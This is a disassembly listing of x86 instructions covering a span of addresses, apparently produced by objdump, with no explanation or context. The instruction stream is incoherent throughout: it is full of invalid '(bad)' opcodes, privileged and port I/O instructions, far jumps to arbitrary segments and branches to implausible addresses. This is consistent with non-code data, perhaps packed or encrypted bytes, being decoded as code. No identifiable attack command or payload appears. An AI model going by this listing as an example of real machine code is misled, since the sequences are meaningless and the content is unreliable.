  40dd83:	jnp    0x40dd2a
  40dd85:	out    dx,al
  40dd86:	inc    ebp
  40dd87:	cld    
  40dd88:	ret    0xb65c
  40dd8b:	jnp    0x40dda2
  40dd8d:	jbe    0x40dd47
  40dd8f:	out    0xc6,eax
  40dd91:	jmp    0xef8db13f
  40dd96:	(bad)  
  40dd97:	fs pop edx
  40dd99:	out    dx,al
  40dd9a:	mov    bl,0xe6
  40dd9c:	or     dh,ah
  40dd9e:	pop    edx
  40dd9f:	mov    dh,0xcc
  40dda1:	loopne 0x40ddc2
  40dda3:	mov    ecx,0xaffcebe6
  40dda8:	test   eax,0x66978e4d
  40ddad:	cmp    eax,DWORD PTR [ecx+0x15ac1e3a]
  40ddb3:	mov    bl,0xb
  40ddb5:	(bad)  
  40ddb6:	xchg   edi,eax
  40ddb7:	cmp    bh,BYTE PTR [edx]
  40ddb9:	jmp    0x59f6:0x1b833204
  40ddc0:	xchg   edx,eax
  40ddc1:	stos   BYTE PTR es:[edi],al
  40ddc2:	adc    BYTE PTR [ebp+0x6],0x28
  40ddc6:	sub    BYTE PTR [edi+0x1381d7c3],cl
  40ddcc:	cmp    bl,al
  40ddce:	xor    eax,0x9831d9d7
  40ddd3:	pop    ds
  40ddd4:	push   cs
  40ddd5:	pop    ds
  40ddd6:	js     0x40ddce
  40ddd8:	and    al,0x6f
  40ddda:	push   ds
  40dddb:	fdiv   QWORD PTR [eax+0x5569aae7]
  40dde1:	push   cs
  40dde2:	addr16 push ebx
  40dde4:	add    ecx,edi
  40dde6:	mul    DWORD PTR [eax-0x2c17ec38]
  40ddec:	les    esi,FWORD PTR [ebp-0x551e319d]
  40ddf2:	sub    esi,DWORD PTR [edx+0x51]
  40ddf5:	outs   dx,DWORD PTR ds:[esi]
  40ddf6:	and    dl,BYTE PTR [ecx-0x59]
  40ddf9:	or     DWORD PTR [ecx+0x39],0xffffffe8
  40ddfd:	xchg   esi,eax
  40ddfe:	sbb    ebp,DWORD PTR [eax-0x4]
  40de01:	into   
  40de02:	mov    BYTE PTR [edx+ebp*4-0x7d],bl
  40de06:	addr16 jmp 0x85c40fa3
  40de0c:	add    cl,BYTE PTR [edi]
  40de0e:	inc    ecx
  40de0f:	cmp    DWORD PTR [ecx-0x68],ebp
  40de12:	and    al,BYTE PTR [ebp-0x1230cc51]
  40de18:	push   ebx
  40de19:	xchg   edi,eax
  40de1a:	je     0x40dddf
  40de1c:	jbe    0x40de19
  40de1e:	(bad)  
  40de1f:	or     eax,0xf5f3feb3
  40de24:	jbe    0x40ddbe
  40de26:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40de27:	mov    ebp,0xcea29d69
  40de2c:	jne    0x40de52
  40de2e:	jae    0x40de5f
  40de30:	mov    al,ds:0xf036ba4
  40de35:	adc    ch,bh
  40de37:	sub    al,0x93
  40de39:	scas   eax,DWORD PTR es:[edi]
  40de3a:	push   cs
  40de3b:	sub    ebp,DWORD PTR [edx+0x27]
  40de3e:	imul   edx,DWORD PTR [ecx],0x6005d2e
  40de44:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40de45:	pop    edi
  40de46:	xchg   ebp,eax
  40de47:	inc    edx
  40de48:	std    
  40de49:	scas   al,BYTE PTR es:[edi]
  40de4a:	cmp    DWORD PTR [edx+0x6a],ebx
  40de4d:	xchg   edx,eax
  40de4e:	test   BYTE PTR [bx-0x20],cl
  40de52:	jecxz  0x40de0d
  40de54:	push   DWORD PTR [edi]
  40de56:	rol    DWORD PTR [edi+0x19ee7d3b],0x3c
  40de5d:	(bad)  
  40de5e:	push   eax
  40de5f:	pop    ebp
  40de60:	push   ss
  40de61:	mov    ds:0xdd306bd5,al
  40de66:	mov    BYTE PTR [ecx-0x1f7d9638],ch
  40de6c:	test   bh,0xcd
  40de6f:	popf   
  40de70:	mov    edx,0xdfcee861
  40de75:	fdiv   st(2),st
  40de77:	cmp    esp,DWORD PTR [ebx-0x8]
  40de7a:	fbstp  TBYTE PTR [ecx]
  40de7c:	mov    ch,cl
  40de7e:	dec    esp
  40de7f:	push   ebp
  40de80:	fbld   TBYTE PTR [ebx]
  40de82:	das    
  40de83:	adc    ebx,esi
  40de85:	jae    0x40dec5
  40de87:	pop    edx
  40de88:	push   ebp
  40de89:	div    WORD PTR [eax+0x6]
  40de8d:	pop    ds
  40de8e:	ins    BYTE PTR es:[edi],dx
  40de8f:	je     0x40de6f
  40de91:	cmp    DWORD PTR [edx+edx*8+0x3aca44ae],esp
  40de98:	and    eax,0xfb6c2d01
  40de9d:	stos   DWORD PTR es:[edi],eax
  40de9e:	mov    esp,0xb66555be
  40dea3:	(bad)  
  40dea4:	xchg   edx,eax
  40dea5:	sub    esp,DWORD PTR [esi-0x80]
  40dea8:	adc    ebx,edx
  40deaa:	or     BYTE PTR [ecx],dh
  40deac:	sbb    al,0x5c
  40deae:	inc    edi
  40deaf:	(bad)  
  40deb0:	fimul  DWORD PTR [ebx+0x57]
  40deb3:	(bad)  
  40deb4:	iret   
  40deb5:	jbe    0x40de62
  40deb7:	mov    ebp,0x39e7d0e8
  40debc:	in     eax,dx
  40debd:	(bad)  
  40debf:	std    
  40dec0:	fwait
  40dec1:	mov    ebx,0x6cfc7e4c
  40dec6:	jno    0x40df06
  40dec8:	fs push ds
  40deca:	xchg   edx,eax
  40decb:	outs   dx,BYTE PTR ds:[esi]
  40decc:	dec    edx
  40decd:	push   edi
  40dece:	pop    esp
  40decf:	jp     0x40de81
  40ded1:	jmp    0x40df0b
  40ded3:	cld    
  40ded4:	jl     0x40deda
  40ded6:	push   esp
  40ded7:	sbb    dl,BYTE PTR [eax+0xf]
  40deda:	aas    
  40dedb:	cmp    ah,BYTE PTR [ebp+esi*2-0x7f0e3318]
  40dee2:	push   ecx
  40dee3:	lock xchg ecx,eax
  40dee5:	sbb    BYTE PTR [ebx-0x5c],al
  40dee8:	jns    0x40def1
  40deea:	out    0x4f,al
  40deec:	outs   dx,DWORD PTR ds:[esi]
  40deed:	jp     0x40df51
  40deef:	mov    al,BYTE PTR [edi-0x31009e37]
  40def5:	outs   dx,DWORD PTR ds:[esi]
  40def6:	jl     0x40deaf
  40def8:	dec    ebx
  40def9:	data16 aad 0x33
  40defc:	fdiv   QWORD PTR [ebx-0x14]
  40deff:	and    bh,cl
  40df01:	push   cs
  40df02:	dec    eax
  40df03:	in     al,dx
  40df04:	or     ah,BYTE PTR [edi+eiz*4]
  40df07:	xchg   esi,eax
  40df08:	in     al,dx
  40df09:	inc    esi
  40df0a:	cld    
  40df0b:	mov    ch,dh
  40df0d:	jmp    0xde21fde9
  40df12:	fwait
  40df13:	in     eax,0x15
  40df15:	jno    0x40df42
  40df17:	ins    DWORD PTR es:[edi],dx
  40df18:	ret    
  40df19:	ins    BYTE PTR es:[edi],dx
  40df1a:	inc    DWORD PTR [edx+0x1f353088]
  40df20:	cmp    edi,DWORD PTR [edx+0x36fbbce8]
  40df26:	(bad)
  40df29:	arpl   WORD PTR [edi+0x5f],dx
  40df2c:	dec    esi
  40df2d:	xchg   ebx,eax
  40df2e:	inc    esp
  40df2f:	xchg   DWORD PTR ds:[ecx],esp
  40df32:	push   es
  40df33:	(bad)  
  40df34:	(bad)  
  40df35:	fwait
  40df36:	and    ebx,DWORD PTR [edx*4-0x17f0a19c]
  40df3d:	(bad)  
  40df3e:	dec    ecx
  40df3f:	loopne 0x40dfb0
  40df41:	push   ebp
  40df42:	rcr    BYTE PTR [eax+0x35f30c29],0x83
  40df49:	fidiv  DWORD PTR [esi+0x16]
  40df4c:	sar    BYTE PTR [edx-0x1bf5bdaa],1
  40df52:	or     edi,ecx
  40df54:	inc    edi
  40df55:	push   DWORD PTR [edi-0xb6ba7eb]
  40df5b:	outs   dx,BYTE PTR ds:[esi]
  40df5c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40df5d:	mov    ds:0xd82c9dfb,al
  40df62:	push   esi
  40df63:	test   BYTE PTR [edx],dh
  40df65:	js     0x40dfd7
  40df67:	xchg   ebp,eax
  40df68:	inc    edi
  40df69:	int3   
  40df6a:	cmp    DWORD PTR [eax+0x50],edi
  40df6d:	mov    ds:0x34fd870f,eax
  40df72:	call   0x644fe7f0
  40df77:	or     eax,0x85fddf77
  40df7c:	out    0x27,al
  40df7e:	or     ch,dl
  40df80:	hlt    
  40df81:	shl    BYTE PTR [esi-0x47789d1e],1
  40df87:	hlt    
  40df88:	xchg   BYTE PTR [edi-0x7f8896be],bh
  40df8e:	cmp    DWORD PTR [esi-0x414f1777],edi
  40df94:	sub    ebx,esp
  40df96:	ins    BYTE PTR es:[edi],dx
  40df97:	xchg   ebp,eax
  40df98:	ins    BYTE PTR es:[edi],dx
  40df99:	jbe    0x40dfee
  40df9b:	in     al,0xde
  40df9d:	mov    cl,0x1c
  40df9f:	vpsubq xmm2,xmm4,xmm5
  40dfa3:	shl    BYTE PTR [ebx+0x29],1
  40dfa6:	jecxz  0x40dfb8
  40dfa8:	mov    ah,0xe6
  40dfaa:	ret    0xd8c0
  40dfad:	ret    0x2b8
  40dfb0:	push   ecx
  40dfb1:	inc    eax
  40dfb2:	xor    BYTE PTR [ebx-0x76],0xf0
  40dfb6:	dec    edi
  40dfb7:	xchg   DWORD PTR [ecx-0x5b],ebp
  40dfba:	jns    0x40dfbf
  40dfbc:	jae    0x40df4d
  40dfbe:	shr    BYTE PTR [edi+0x15],1
  40dfc1:	stos   DWORD PTR es:[edi],eax
  40dfc2:	lock xchg edx,eax
  40dfc4:	aas    
  40dfc5:	daa    
  40dfc6:	gs inc ebp
  40dfc8:	fcomp  QWORD PTR [ebp-0x14827d89]
  40dfce:	gs xchg edi,eax
  40dfd0:	jo     0x40dfe3
  40dfd2:	add    al,0x41
  40dfd4:	loop   0x40e047
  40dfd6:	inc    eax
  40dfd7:	xor    eax,0xa3218a9d
  40dfdc:	jge    0x40dfd8
  40dfde:	mov    edx,0xc88135e0
  40dfe3:	call   0x5d54:0xf5e2ac7c
  40dfea:	fidivr WORD PTR [ebx]
  40dfec:	int3   
  40dfed:	add    eax,0x5b4605f3
  40dff2:	lock stos BYTE PTR es:[edi],al
  40dff4:	das    
  40dff5:	add    eax,0x56f99e38
  40dffa:	jno    0x40e00b
  40dffc:	add    eax,0x90b4fa85
  40e001:	in     al,0xd9
  40e003:	pop    ebp
  40e004:	mov    ah,cl
  40e006:	icebp  
  40e007:	or     ecx,DWORD PTR ds:0x99babc97
  40e00d:	(bad)  
  40e00e:	dec    esp
  40e00f:	and    DWORD PTR [eax+ecx*2-0x37],esp
  40e013:	(bad)  
  40e015:	cmc    
  40e016:	jo     0x40dfb7
  40e018:	inc    esp
  40e019:	gs or  ebp,edx
  40e01c:	imul   eax,DWORD PTR [edi-0x626883db],0xffffffb4
  40e023:	imul   ebp,DWORD PTR [edx+0x79],0x985a0e57
  40e02a:	or     ebx,DWORD PTR [esi-0x2c715531]
  40e030:	adc    ebp,DWORD PTR [ebx-0x677c4646]
  40e036:	rcl    BYTE PTR [edx],0xe1
  40e039:	out    0x2,al
  40e03b:	gs or  ch,bh
  40e03e:	jmp    0x4a07:0xa7c96b87
  40e045:	push   es
  40e046:	adc    eax,DWORD PTR [edx+eax*1-0x4f]
  40e04a:	pop    ecx
  40e04b:	xchg   esi,eax
  40e04c:	ret    
  40e04d:	mov    ecx,0x7d97a916
  40e052:	xchg   esi,eax
  40e053:	into   
  40e054:	outs   dx,BYTE PTR ds:[esi]
  40e055:	(bad)  
  40e057:	mov    ss,WORD PTR [esi]
  40e059:	pop    ecx
  40e05a:	test   eax,0x6785613b
  40e05f:	mov    WORD PTR [esi],cs
  40e061:	or     DWORD PTR [eax-0x6c],0x317a6f64
  40e068:	mov    eax,ds:0x9046c796
  40e06d:	pop    ebp
  40e06e:	pop    esi
  40e06f:	lea    ebp,[eax-0x3f]
  40e072:	mov    ds:0x5f1e1f3b,al
  40e077:	xor    edi,DWORD PTR [ebx]
  40e079:	ins    BYTE PTR es:[edi],dx
  40e07a:	or     BYTE PTR [eax-0x13],al
  40e07d:	stos   BYTE PTR es:[di],al
  40e07f:	add    cl,BYTE PTR ds:0xca6fef96
  40e085:	mov    edx,0x595fb
  40e08a:	ss mov edi,0xdce17496
  40e090:	scas   eax,DWORD PTR es:[edi]
  40e091:	std    
  40e092:	rsm    
  40e094:	inc    esp
  40e095:	inc    ebp
  40e096:	shl    ebp,1
  40e098:	lods   eax,DWORD PTR ds:[esi]
  40e099:	js     0x40e02d
  40e09b:	mov    edi,DWORD PTR [edx]
  40e09d:	or     al,0xab
  40e09f:	in     eax,dx
  40e0a0:	test   BYTE PTR [edx],ch
  40e0a2:	mov    ds:0xace81ed1,al
  40e0a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e0a8:	mov    gs,edi
  40e0aa:	jmp    esp
  40e0ac:	scas   eax,DWORD PTR es:[edi]
  40e0ad:	pop    esi
  40e0ae:	ficomp DWORD PTR [ebx+ebp*1-0x414905e9]
  40e0b5:	outs   dx,DWORD PTR ds:[esi]
  40e0b6:	cmp    eax,DWORD PTR [ebx]
  40e0b8:	loop   0x40e057
  40e0ba:	xchg   ecx,eax
  40e0bb:	fwait
  40e0bc:	push   esp
  40e0bd:	xchg   ah,al
  40e0bf:	inc    esp
  40e0c0:	(bad)  
  40e0c1:	and    BYTE PTR [ecx],al
  40e0c3:	pushf  
  40e0c4:	ret    0x395
  40e0c7:	scas   al,BYTE PTR es:[edi]
  40e0c8:	fstp   QWORD PTR [ecx]
  40e0ca:	mov    ah,0x94
  40e0cc:	sub    ah,BYTE PTR [ebx-0x41]
  40e0cf:	pop    cx
  40e0d1:	fwait
  40e0d2:	inc    ebx
  40e0d3:	addr16 int 0x27
  40e0d6:	lds    edx,FWORD PTR [edi+0x67]
  40e0d9:	sbb    al,0xda
  40e0db:	cmp    DWORD PTR [edx+ecx*1+0x12],edx
  40e0df:	into   
  40e0e0:	je     0x40e0b7
  40e0e2:	imul   DWORD PTR [esi]
  40e0e4:	inc    edi
  40e0e5:	mov    dl,0xdd
  40e0e7:	xor    DWORD PTR [ebx-0x42824397],esp
  40e0ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e0ee:	loopne 0x40e0f5
  40e0f0:	sbb    al,0xcf
  40e0f2:	sub    eax,0x784e47d9
  40e0f7:	adc    BYTE PTR [ecx],dl
  40e0f9:	adc    al,0x3b
  40e0fb:	out    0x28,al
  40e0fd:	(bad)  
  40e0fe:	xchg   ebx,eax
  40e0ff:	or     edx,edi
  40e101:	lods   al,BYTE PTR ds:[esi]
  40e102:	repz dec edi
  40e104:	sub    BYTE PTR [ebx],ch
  40e106:	cmp    al,dh
  40e108:	loop   0x40e0af
  40e10a:	dec    ecx
  40e10b:	mov    WORD PTR [ebp-0x3545519d],fs
  40e111:	jnp    0x40e0dd
  40e113:	inc    dh
  40e115:	out    0xd2,eax
  40e117:	jp     0x40e0c3
  40e119:	sub    eax,0x1725a503
  40e11e:	xor    DWORD PTR [ebp+0x4a24946b],ebp
  40e124:	dec    ecx
  40e125:	hlt    
  40e126:	inc    ecx
  40e128:	repnz add dl,bh
  40e12b:	pop    esp
  40e12c:	fiadd  WORD PTR [ebx+0x9]
  40e12f:	(bad)  
  40e130:	(bad)  
  40e131:	xchg   ebp,eax
  40e132:	stos   DWORD PTR es:[edi],eax
  40e133:	pop    esi
  40e134:	jg     0x40e13b
  40e136:	mov    ds:0x2feaf87f,al
  40e13b:	dec    edi
  40e13c:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e13e:	div    DWORD PTR [ecx]
  40e140:	out    0x2e,eax
  40e142:	and    ecx,DWORD PTR [edx+0x20ead233]
  40e148:	cwde   
  40e149:	xor    DWORD PTR [edi+0x3c],eax
  40e14c:	mov    eax,0xf9920339
  40e151:	jb     0x40e1ce
  40e153:	ffree  st(0)
  40e155:	cmp    DWORD PTR [edi+0x26],eax
  40e158:	push   edi
  40e159:	mov    eax,0x2bc3df79
  40e15e:	pop    ds
  40e15f:	pop    esp
  40e160:	mov    esi,0x803fdd51
  40e165:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e166:	bound  edx,QWORD PTR [esi-0x71aa4495]
  40e16c:	ror    ecx,0x2b
  40e16f:	xchg   DWORD PTR [ebx+0xe],ecx
  40e172:	mov    ebx,0x590b25d3
  40e177:	loope  0x40e1be
  40e179:	mov    bl,0x3f
  40e17c:	jne    0x40e1fb
  40e17e:	jnp    0x40e1d4
  40e180:	mov    ch,cl
  40e182:	(bad)  
  40e183:	push   ecx
  40e184:	xchg   ecx,ecx
  40e186:	cmp    BYTE PTR [edi-0x465eea3f],al
  40e18c:	and    al,0x14
  40e18e:	mov    bl,0x85
  40e190:	mov    ah,cl
  40e192:	ins    BYTE PTR es:[edi],dx
  40e193:	imul   eax,DWORD PTR [esi],0x54
  40e196:	loopne 0x40e128
  40e198:	pop    edx
  40e199:	scas   al,BYTE PTR es:[edi]
  40e19a:	int    0xf1
  40e19c:	push   ebp
  40e19d:	add    edi,edx
  40e19f:	xchg   edx,ebp
  40e1a1:	es sti 
  40e1a3:	fisttp DWORD PTR [ecx+ebx*4-0x11]
  40e1a7:	lahf   
  40e1a8:	cwde   
  40e1a9:	jmp    0x82d1:0x982e18f4
  40e1b0:	pop    es
  40e1b1:	inc    eax
  40e1b2:	enter  0xec2a,0xe2
  40e1b6:	(bad)  
  40e1b7:	xchg   edi,eax
  40e1b8:	push   ebp
  40e1b9:	add    ecx,DWORD PTR [edi+0x18e41d39]
  40e1bf:	and    bh,ch
  40e1c1:	outs   dx,DWORD PTR ds:[esi]
  40e1c2:	adc    BYTE PTR [esi+esi*2-0x6c297364],0x9e
  40e1ca:	in     eax,0x24
  40e1cc:	add    eax,0x373b670f
  40e1d1:	pop    esi
  40e1d2:	in     eax,0xc6
  40e1d4:	outs   dx,DWORD PTR ds:[esi]
  40e1d5:	mov    eax,0x7663cce8
  40e1da:	(bad)
  40e1de:	sbb    DWORD PTR [ecx+ecx*8],ebx
  40e1e1:	push   ss
  40e1e2:	sub    DWORD PTR [eax+ebp*2],0xffffffd9
  40e1e6:	add    ah,cl
  40e1e8:	xor    eax,0xa1b0671b
  40e1ed:	cwde   
  40e1ee:	ins    DWORD PTR es:[edi],dx
  40e1ef:	xor    ebp,ebx
  40e1f1:	dec    ebx
  40e1f2:	sub    bh,BYTE PTR [esi+0x72ff0d2f]
  40e1f8:	jb     0x40e265
  40e1fa:	jl     0x40e1e2
  40e1fc:	pop    ss
  40e1fd:	scas   al,BYTE PTR es:[edi]
  40e1fe:	loop   0x40e22c
  40e200:	add    dh,BYTE PTR [ecx+0x19]
  40e203:	jne    0x40e1bd
  40e205:	dec    ebx
  40e206:	bound  edx,QWORD PTR [ebp-0x1]
  40e209:	jle    0x40e220
  40e20b:	jmp    0xd12c:0x12910bc7
  40e212:	clc    
  40e213:	cld    
  40e214:	dec    ecx
  40e215:	int    0x9c
  40e217:	xor    esi,DWORD PTR [ecx+0x666142e9]
  40e21d:	push   ebx
  40e21e:	repz push 0x7d
  40e221:	not    BYTE PTR [ebx+edx*2]
  40e224:	pop    esi
  40e225:	icebp  
  40e226:	ror    DWORD PTR gs:[eax+0x6f2b2d3],cl
  40e22d:	push   edi
  40e22e:	push   ds
  40e22f:	and    BYTE PTR [edx+0x25213198],0xc4
  40e236:	pop    ds
  40e237:	cdq    
  40e238:	out    0xe7,al
  40e23a:	cmp    ch,BYTE PTR [ecx]
  40e23c:	cmp    ecx,DWORD PTR [edx-0x5e]
  40e23f:	cld    
  40e240:	sub    eax,0x81f703fc
  40e245:	setle  BYTE PTR [ebp-0x50]
  40e249:	sub    eax,0x6c07d00d
  40e24e:	jl     0x40e2ab
  40e250:	sahf   
  40e251:	push   cs
  40e252:	arpl   WORD PTR [esi],bp
  40e254:	dec    al
  40e256:	or     al,0x95
  40e258:	lahf   
  40e259:	pop    ecx
  40e25a:	and    edx,esp
  40e25c:	push   eax
  40e25d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e25e:	call   0x4864:0x76e9be4c
  40e265:	aaa    
  40e266:	cmp    bh,BYTE PTR [ecx]
  40e268:	and    eax,0xd0e9e8cd
  40e26d:	mov    bh,0x38
  40e26f:	mov    eax,0xef1abe63
  40e274:	outs   dx,BYTE PTR ds:[esi]
  40e275:	imul   esi,DWORD PTR [edx+0x5a],0xe366428a
  40e27c:	loope  0x40e20a
  40e27e:	retf   
  40e27f:	jle    0x40e2fb
  40e281:	adc    BYTE PTR ds:0xd1a19ca3,0x76
  40e288:	adc    DWORD PTR [edi+0x678581a1],0xd
  40e28f:	jno    0x40e25a
  40e291:	pop    ebx
  40e292:	xchg   ebp,eax
  40e293:	push   ecx
  40e294:	scas   al,BYTE PTR es:[edi]
  40e295:	cs dec eax
  40e297:	dec    esi
  40e298:	repnz pusha 
  40e29a:	and    ch,ah
  40e29c:	test   BYTE PTR [esi-0x61a3349b],cl
  40e2a2:	(bad)  
  40e2a3:	ror    DWORD PTR [edx-0x3a],cl
  40e2a6:	push   ecx
  40e2a7:	ficom  WORD PTR ds:0x263b461b
  40e2ad:	loope  0x40e27d
  40e2af:	test   BYTE PTR [edi],al
  40e2b1:	(bad)  
  40e2b2:	or     DWORD PTR [ebp-0x4f],esp
  40e2b5:	dec    esp
  40e2b6:	outs   dx,DWORD PTR ds:[esi]
  40e2b7:	jnp    0x40e23d
  40e2b9:	jecxz  0x40e298
  40e2bb:	pop    edx
  40e2bc:	ret    
  40e2bd:	out    0xf6,al
  40e2bf:	pop    edi
  40e2c0:	cmp    ebx,DWORD PTR [ebp+0x3fcbe743]
  40e2c6:	enter  0x67f6,0xbb
  40e2ca:	cmp    eax,0xdc70e2ca
  40e2cf:	in     al,0x75
  40e2d1:	or     dl,BYTE PTR [edx]
  40e2d3:	repz test eax,0x6b89ba87
  40e2d9:	out    0xf5,al
  40e2db:	dec    eax
  40e2dc:	xor    ch,BYTE PTR gs:[edi+0x58b28ded]
  40e2e3:	pop    ecx
  40e2e4:	(bad)  
  40e2e5:	ja     0x40e34f
  40e2e7:	cmp    esi,DWORD PTR [ebp+0x18]
  40e2ea:	jle    0x40e351
  40e2ec:	out    dx,eax
  40e2ed:	call   0x1a24c66
  40e2f2:	or     al,0x9
  40e2f4:	aas    
  40e2f5:	(bad)  [esi]
  40e2f7:	xchg   ebx,eax
  40e2f8:	mov    edi,0x2250fc23
  40e2fd:	(bad)  
  40e2fe:	and    al,BYTE PTR [ecx+0x13c8f5e2]
  40e304:	(bad)  
  40e305:	jns    0x40e2de
  40e307:	les    eax,FWORD PTR [eax-0x5cedab2c]
  40e30d:	dec    edx
  40e30e:	imul   edx,esp,0x7a
  40e311:	cs pushf 
  40e313:	std    
  40e314:	ja     0x40e307
  40e316:	dec    ecx
  40e317:	adc    bl,BYTE PTR [edx-0x28c314d8]
  40e31d:	mov    DWORD PTR [eax+0xf],eax
  40e320:	pop    edx
  40e321:	in     eax,dx
  40e322:	out    0x85,eax
  40e324:	jno    0x40e310
  40e326:	test   al,0x39
  40e328:	addr16 dec ecx
  40e32a:	ins    BYTE PTR es:[edi],dx
  40e32b:	jnp    0x40e36b
  40e32d:	imul   eax,ebp,0xffffffb3
  40e330:	dec    esi
  40e331:	xchg   ecx,eax
  40e332:	fidiv  WORD PTR [esi+edx*8]
  40e335:	jp     0x40e2c3
  40e337:	dec    ebp
  40e338:	pop    edx
  40e339:	xor    eax,0xefa032b8
  40e33e:	sub    BYTE PTR [esi+0x7c],dh
  40e341:	(bad)  
  40e342:	sar    BYTE PTR [ecx+esi*8],1
  40e345:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e346:	sub    edi,ebp
  40e348:	mov    DWORD PTR [ecx],esi
  40e34a:	pop    ecx
  40e34b:	cdq    
  40e34c:	mov    eax,0x5c0c0101
  40e351:	lahf   
  40e352:	push   ebx
  40e353:	cmp    ch,0x97
  40e356:	pop    ecx
  40e357:	iret   
  40e358:	int3   
  40e359:	adc    edx,esp
  40e35b:	in     al,dx
  40e35c:	xor    al,dl
  40e35e:	(bad)  
  40e35f:	not    DWORD PTR [ebp+0x33c77cee]
  40e365:	fisttp WORD PTR [eax+0x3c5fa76e]
  40e36b:	fwait
  40e36c:	or     BYTE PTR [ecx-0x6900ddab],ah
  40e372:	cmp    BYTE PTR [ebx+0x4],ah
  40e375:	lods   al,BYTE PTR ds:[esi]
  40e376:	mov    dl,bl
  40e378:	push   ss
  40e379:	mov    esi,0xa78284f6
  40e37e:	pop    es
  40e37f:	jg     0x40e368
  40e381:	sub    ch,BYTE PTR [ebx+0x52]
  40e384:	mov    bl,0x6c
  40e386:	mov    bl,0x4
  40e388:	xchg   esi,eax
  40e389:	cmp    eax,DWORD PTR [ebx]
  40e38b:	push   ecx
  40e38c:	repnz or DWORD PTR [ecx-0x5f],eax
  40e390:	pop    ebp
  40e391:	inc    edi
  40e392:	lods   al,BYTE PTR ds:[esi]
  40e393:	add    esp,DWORD PTR [edi+0x1e28b507]
  40e399:	jbe    0x40e40e
  40e39b:	push   edi
  40e39c:	inc    eax
  40e39d:	aaa    
  40e39e:	mov    ebp,DWORD PTR [esi+0x67b28caa]
  40e3a4:	mov    WORD PTR [edi*8-0x1e61acfd],?
  40e3ab:	test   al,0xeb
  40e3ad:	inc    esp
  40e3ae:	xchg   BYTE PTR [eax-0x1e26eab6],ch
  40e3b4:	idiv   BYTE PTR [edi]
  40e3b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e3b7:	pop    ss
  40e3b8:	add    eax,0x9c736c45
  40e3bd:	sbb    BYTE PTR [ebx-0x2f],cl
  40e3c0:	mov    esp,0xc628fc8a
  40e3c5:	fdivr  DWORD PTR [edi+ebx*1]
  40e3c8:	mov    edx,esp
  40e3ca:	lds    ebx,FWORD PTR [edx-0xe9ceb64]
  40e3d0:	cmp    al,dh
  40e3d2:	repz lea esi,[eax]
  40e3d5:	mov    esi,0xedd33260
  40e3da:	(bad)  
  40e3db:	test   eax,0x24d4eb7b
  40e3e0:	mov    al,ds:0xf61db57
  40e3e5:	icebp  
  40e3e6:	mov    esp,0xcbacf66c
  40e3eb:	mov    cl,0x28
  40e3ed:	push   edx
  40e3ee:	and    al,0xe7
  40e3f0:	adc    al,0x77
  40e3f2:	cdq    
  40e3f3:	fstp   QWORD PTR [edi]
  40e3f5:	popa   
  40e3f6:	dec    esp
  40e3f7:	test   eax,0x1b084821
  40e3fc:	xchg   esp,eax
  40e3fd:	push   eax
  40e3fe:	fistp  QWORD PTR [ecx]
  40e400:	bound  esi,QWORD PTR [ecx+0xcf1b]
  40e406:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e407:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e408:	ins    DWORD PTR es:[edi],dx
  40e409:	xchg   DWORD PTR [eax+edx*4-0x4dc18851],edi
  40e410:	lahf   
  40e411:	jb     0x40e3f5
  40e413:	dec    ecx
  40e414:	sub    esi,DWORD PTR [ebx+ebx*4-0x3838d720]
  40e41b:	or     eax,0x6082b918
  40e420:	je     0x40e3a3
  40e422:	jb     0x40e3f8
  40e424:	popa   
  40e425:	and    al,0x34
  40e427:	(bad)  
  40e428:	in     al,0x93
  40e42a:	mov    al,ds:0x599942ba
  40e42f:	scas   eax,DWORD PTR es:[edi]
  40e430:	mov    dl,0x67
  40e432:	sbb    bl,ch
  40e434:	mov    dh,BYTE PTR [eax+0x13]
  40e437:	out    0xfb,eax
  40e439:	adc    al,0x5a
  40e43b:	jbe    0x40e4ae
  40e43d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e43e:	lods   al,BYTE PTR ds:[esi]
  40e43f:	push   es
  40e440:	add    eax,0x3115df01
  40e445:	dec    ecx
  40e446:	xor    eax,0x886486bd
  40e44b:	xor    BYTE PTR [esi+0x23e247b9],dl
  40e451:	test   ch,bl
  40e453:	mov    bh,0x2f
  40e455:	(bad)  
  40e456:	(bad)  [eax]
  40e458:	xor    bl,al
  40e45a:	daa    
  40e45b:	or     BYTE PTR [esi+esi*8+0x1],bl
  40e45f:	xchg   esp,eax
  40e460:	or     dl,BYTE PTR [ecx+0x1e]
  40e463:	mov    ebx,0x8e9a6a0
  40e468:	sbb    al,0x36
  40e46a:	cld    
  40e46b:	daa    
  40e46c:	mov    ds:0x718e6646,eax
  40e471:	cdq    
  40e472:	add    al,0x32
  40e474:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e475:	cmc    
  40e476:	xchg   DWORD PTR [edi+edx*4],edx
  40e479:	cmp    eax,0x6d6c0042
  40e47e:	test   eax,0x194d70e0
  40e483:	mov    DWORD PTR [edi-0x41],ecx
  40e486:	test   BYTE PTR [edx],0x6f
  40e489:	inc    ebp
  40e48a:	fisubr DWORD PTR [ecx+0xa]
  40e48d:	inc    edi
  40e48e:	(bad)
  40e493:	lods   al,BYTE PTR ds:[esi]
  40e494:	mov    al,ds:0x144e5856
  40e499:	mov    al,ds:0x32d2d46c
  40e49e:	push   0xefbe0eb9
  40e4a3:	sub    ch,bh
  40e4a5:	push   ds
  40e4a6:	xor    al,0x97
  40e4a8:	daa    
  40e4a9:	mov    cl,0x4
  40e4ab:	mov    bl,0xde
  40e4ad:	fisttp WORD PTR [ebx+0x59]
  40e4b0:	push   cs
  40e4b1:	cmp    ch,BYTE PTR [ebx-0x56330779]
  40e4b7:	leave  
  40e4b8:	mov    ecx,0x67d574c4
  40e4bd:	arpl   WORD PTR [ebx],ax
  40e4bf:	push   es
  40e4c0:	sbb    dh,ch
  40e4c2:	xchg   esp,eax
  40e4c3:	out    0xb6,al
